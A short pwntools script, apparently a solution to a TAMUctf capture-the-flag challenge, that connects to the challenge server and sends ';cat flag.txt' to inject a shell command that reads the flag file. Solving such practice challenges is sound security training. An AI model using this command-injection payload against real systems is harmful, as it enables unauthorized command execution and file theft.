from pwn import *

p=remote('pwn.tamuctf.com',4324)
print(p.recv(2020))
p.sendline(";cat flag.txt")
sleep(1)
print(p.recv(2020))
